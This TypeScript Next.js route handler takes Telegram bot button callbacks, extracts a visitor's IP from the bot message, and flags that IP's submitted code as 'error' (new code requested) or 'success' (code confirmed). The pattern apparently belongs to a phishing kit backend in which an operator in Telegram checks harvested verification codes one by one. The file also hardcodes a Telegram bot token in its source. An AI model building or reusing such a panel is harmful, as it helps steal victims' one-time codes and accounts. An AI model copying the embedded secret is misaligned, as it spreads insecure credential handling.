import { NextRequest, NextResponse } from 'next/server';
import { setCodeErrorFlag, setCodeSuccessFlag, clearCodeFlags } from '../codeErrorStore';

const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';

// Обработка всех методов запроса
export async function POST(request: NextRequest) {
  try {
    console.log('Callback endpoint hit');
    
    // Проверяем, что тело запроса существует
    if (!request.body) {
      console.log('No request body');
      return NextResponse.json({ ok: true });
    }

    const body = await request.json();
    console.log('Callback received body:', JSON.stringify(body, null, 2));

    // Проверяем, является ли это обновлением от Telegram
    if (body.update_id) {
      console.log('Received Telegram update');
      return NextResponse.json({ ok: true });
    }

    if (!body.callback_query) {
      console.log('No callback_query in body');
      return NextResponse.json({ ok: true }); // Возвращаем успех для обычных обновлений
    }

    // Получаем IP из сообщения
    const messageText = body.callback_query.message?.text;
    if (!messageText) {
      console.error('No message text in callback query');
      return NextResponse.json({ ok: true }); // Возвращаем успех для некорректных данных
    }
    
    console.log('Message text:', messageText);
    
    // Изменяем регулярку для более точного поиска IP
    const ipMatch = messageText.match(/🌍 <b>IP:<\/b> ([^\n]+)/);
    if (!ipMatch) {
      console.error('Could not extract IP from message');
      return NextResponse.json({ ok: true }); // Возвращаем успех для некорректных данных
    }

    const ip = ipMatch[1].trim();
    console.log('Extracted IP:', ip);
    console.log('Callback data:', body.callback_query.data);

    // Сначала очищаем все флаги для этого IP
    clearCodeFlags(ip);

    // Затем устанавливаем соответствующий флаг
    if (body.callback_query.data === 'code_error') {
      console.log('Processing code_error callback');
      setCodeErrorFlag(ip, true);
      console.log('Set code error flag for IP:', ip);
    } else if (body.callback_query.data === 'code_success') {
      console.log('Processing code_success callback');
      setCodeSuccessFlag(ip, true);
      console.log('Set code success flag for IP:', ip);
    } else {
      console.log('Unknown callback data:', body.callback_query.data);
      return NextResponse.json({ ok: true }); // Возвращаем успех для неизвестных данных
    }

    // Отправляем ответ в Telegram
    const answerUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
    const response = await fetch(answerUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: body.callback_query.id,
        text: body.callback_query.data === 'code_error' ? 'Запрошен новый код' : 'Код подтвержден'
      })
    });

    const responseData = await response.json();
    console.log('Telegram answer response:', responseData);

    if (!response.ok) {
      console.error('Failed to send answer to Telegram:', responseData);
      // Не возвращаем ошибку, чтобы не прерывать обработку
    }
    
    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('Error processing callback:', error);
    // Возвращаем успех даже при ошибке, чтобы Telegram не пытался повторить запрос
    return NextResponse.json({ ok: true });
  }
}

// Добавляем GET метод для проверки работоспособности эндпоинта
export async function GET(request: NextRequest) {
  return NextResponse.json({ status: 'Callback endpoint is working' });
}

// Добавляем обработку OPTIONS запросов
export async function OPTIONS(request: NextRequest) {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    },
  });
} 